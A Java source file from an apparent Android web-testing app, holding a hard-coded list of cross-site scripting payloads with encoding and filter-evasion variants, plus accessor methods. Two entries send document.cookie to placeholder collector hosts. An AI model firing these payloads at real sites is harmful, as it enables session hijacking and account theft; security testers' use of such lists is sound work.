package com.dibsyhex.droid10.vectormodels;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.database.Cursor;
import android.util.Log;
import android.widget.Toast;

import com.dibsyhex.droid10.database.StorageHelper;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by WHOIS on 27-02-2015.
 */
public class CrossSiteScriptingVectorModel {

    private static CrossSiteScriptingVectorModel crossSiteScriptingVectorModel=new CrossSiteScriptingVectorModel();

    private static final String[]crossSiteScriptingVectors=new String []{
            "<script>alert(1);</script>",
            "<img src=x onerror=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "\"\"><img%20src=x>",
            "><script>",
            "<<script>alert(1);//<</script>",
            "<script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "'><script>alert(1);</script>",
            "\";alert('1');//",
            "%3cscript%3ealert(\"WXSS\");%3c/script%3e",
            "%3cscript%3ealert(1);%3c%2fscript%3e",
            "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E",
            "&ltscript&gtalert(1);</script>",
            "&ltscript&gtalert(1);&ltscript&gtalert",
            "<xss><script>alert('WXSS')</script></vulnerable>",
            "<IMG%20SRC='javascript:alert(1)'>",
            "<IMG%20SRC=\"javascript:alert('WXSS');\">",
            "<IMG%20SRC=\"javascript:alert('WXSS')\"",
            "<IMG%20SRC=javascript:alert('WXSS')>",
            "<IMG%20SRC=JaVaScRiPt:alert('WXSS')>",
            "<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>",
            "<IMG%20SRC=`javascript:alert(\"'WXSS'\")`>",
            "<IMG%20\"\"\"><SCRIPT>alert(\"WXSS\")</SCRIPT>\">",
            "<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG%20SRC='javasc	ript:alert(document.cookie)'>",
            "<IMG%20SRC=\"jav	ascript:alert('WXSS');\">",
            "<IMG%20SRC=\"jav&#x09;ascript:alert('WXSS');\">",
            "<IMG%20SRC=\"jav&#x0A;ascript:alert('WXSS');\">",
            "<IMG%20SRC=\"jav&#x0D;ascript:alert('WXSS');\">",
            "<IMG%20SRC=\"%20&#14;%20javascript:alert('WXSS');\">",
            "<IMG%20DYNSRC=\"javascript:alert('WXSS')\">",
            "<IMG%20LOWSRC=\"javascript:alert('WXSS')\">",
            "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>",
            "<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
            "<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E",
            "\"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>",
            "%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E",
            "';alert(String.fromCharCode(88,83,83))",
            "\';alert(String.fromCharCode(88,83,83))//",
            ";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",
            "'';!--\"<XSS>=&{()}"
    };




    private CrossSiteScriptingVectorModel(){

    }

    public static CrossSiteScriptingVectorModel getInstance(){
        return crossSiteScriptingVectorModel;
    }







    public static List getVectorsList(){
        List<String>vectorsList=null;
        try{
            List<String>list=Arrays.asList(crossSiteScriptingVectors);
            vectorsList=new ArrayList<String>(list);

        }catch (Exception e){
            Log.e("ERROR","getVectorList():"+e.toString());
        }


        return vectorsList;
    }


    public static List getUserDefinedVectorList(){
        List<String>vectorsList=new ArrayList<String>();

        return vectorsList;
    }

    public static List getInbuiltVectorList(){
        List<String>vectorsList=new ArrayList<String>();

        return vectorsList;
    }



}
